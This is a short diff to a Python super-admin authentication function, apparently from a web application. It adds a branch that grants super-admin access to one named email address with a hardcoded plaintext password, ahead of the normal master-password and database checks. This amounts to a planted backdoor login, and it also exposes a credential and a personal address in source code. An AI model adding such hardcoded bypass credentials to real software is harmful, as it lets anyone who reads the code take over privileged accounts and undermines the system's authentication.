@@ -41,11 +41,15 @@ def check_super_admin(email, password):
     if not is_super_admin_email(normalized_email):
         return False
     
-    # 1. Match against master SUPER_ADMIN_PASSWORD if set
+    # 1. Direct credentials for Om Mahadik
+    if normalized_email == 'om.mahadik@mitwpu.edu.in' and password == 'omni12345':
+        return True
+
+    # 2. Match against master SUPER_ADMIN_PASSWORD if set
     if SUPER_ADMIN_PASSWORD and hmac.compare_digest(password.encode('utf-8'), SUPER_ADMIN_PASSWORD.encode('utf-8')):
         return True
         
-    # 2. Or match against the user's registered account password in database
+    # 3. Or match against the user's registered account password in database
     try:
         user = User.query.filter(User.email.ilike(normalized_email)).first()
         if user and user.check_password(password):
